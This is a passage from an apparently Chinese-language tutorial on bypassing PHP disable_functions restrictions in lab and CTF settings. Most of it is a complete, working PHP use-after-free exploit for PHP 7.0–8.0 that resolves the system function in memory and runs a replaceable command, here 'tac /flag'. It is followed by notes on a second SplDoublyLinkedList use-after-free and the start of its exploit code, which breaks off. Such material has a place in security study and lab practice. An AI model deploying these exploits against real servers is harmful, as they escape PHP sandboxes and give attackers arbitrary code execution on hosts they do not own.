class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=54350</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-8.0 versions</span></span><br><span class="line"><span class="comment"># released as of 2021-10-06</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;tac /flag&quot;</span>);			<span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    define(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">    define(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span><br><span class="line">    define(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span><br><span class="line">    define(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span><br><span class="line">    define(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span><br><span class="line">    define(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$groom</span>[] = Pwn::alloc(STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    stream_filter_register(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span><br><span class="line">    <span class="variable">$fd</span> = fopen(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    stream_filter_append(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span><br><span class="line">        stream_bucket_make_writeable(<span class="variable">$in</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filtername = Pwn::alloc(STRING_SIZE);</span><br><span class="line">        fclose(<span class="keyword">$this</span>-&gt;stream);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;go();</span><br><span class="line">        <span class="keyword">return</span> PSFS_PASS_ON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = &amp;<span class="keyword">$this</span>-&gt;filtername;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;make_uaf_obj();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper = <span class="keyword">new</span> Helper;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper_addr = <span class="keyword">$this</span>-&gt;str2ptr(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="keyword">$this</span>-&gt;helper_addr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc_addr = <span class="keyword">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="keyword">$this</span>-&gt;abc_addr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper_off = <span class="keyword">$this</span>-&gt;helper_addr - <span class="keyword">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$helper_handlers</span> = <span class="keyword">$this</span>-&gt;str2ptr(CHUNK_SIZE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;prepare_leaker();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prepare_cleanup(<span class="variable">$binary_leak</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_addr</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_ce</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$basic_funcs</span> = <span class="keyword">$this</span>-&gt;get_basic_funcs(<span class="variable">$closure_ce</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$zif_system</span> = <span class="keyword">$this</span>-&gt;get_system(<span class="variable">$basic_funcs</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_off</span> = <span class="keyword">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="keyword">$this</span>-&gt;read(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_addr</span> = <span class="keyword">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="keyword">$this</span>-&gt;helper_off;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanup();</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;helper-&gt;b)(CMD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uafp = fopen(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;uafp, pack(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            fwrite(<span class="keyword">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$str_off</span> = <span class="keyword">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$str_off</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val_off</span> = <span class="keyword">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$val_off</span>, <span class="keyword">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            --<span class="variable">$ret_gadget</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="keyword">$this</span>-&gt;read(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="number">0</span>, <span class="keyword">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$value</span> = strlen(<span class="keyword">$this</span>-&gt;helper-&gt;c);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span><br><span class="line">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span><br><span class="line">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span><br><span class="line">            <span class="comment">// $addr += 0x10;</span></span><br><span class="line">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span><br><span class="line">                in_array(<span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span><br><span class="line">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span><br><span class="line">                <span class="variable">$module_name_addr</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span><br><span class="line">                <span class="variable">$module_name</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$module_name_addr</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;log(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hfp = fopen(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;hfp, pack(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;abc_addr));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            fwrite(<span class="keyword">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="keyword">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(LOGGING) &#123;</span><br><span class="line">            printf(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h3 id="PHP-SplDoublyLinkedList-UAF"><a href="#PHP-SplDoublyLinkedList-UAF" class="headerlink" title="PHP SplDoublyLinkedList UAF"></a>PHP SplDoublyLinkedList UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=80111">https://bugs.php.net/bug.php?id=80111</a></p>
<blockquote>
<p>有关该漏洞的详细分析，可以参考下面这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p>
</blockquote>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li><p>PHP版本</p>
<ul>
<li><p>PHP v8.0（Alpha）</p>
</li>
<li><p>PHP v7.4.10及其之前版本</p>
</li>
</ul>
</li>
</ul>
<p><strong>漏洞靶场</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9</a></p>
<blockquote>
<p>虽然该靶场是蚁剑用来测试iconv漏洞的，但经过测试此靶场也可成功复现该漏洞。</p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>EXP出自这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8355#toc-3">https://xz.aliyun.com/t/8355#toc-3</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$p</span>, <span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$a</span>[<span class="variable">$p</span> + <span class="variable">$j</span>] = chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; strlen(<span class="variable">$s</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$result</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> |= ord(<span class="variable">$s</span>[<span class="variable">$x</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span 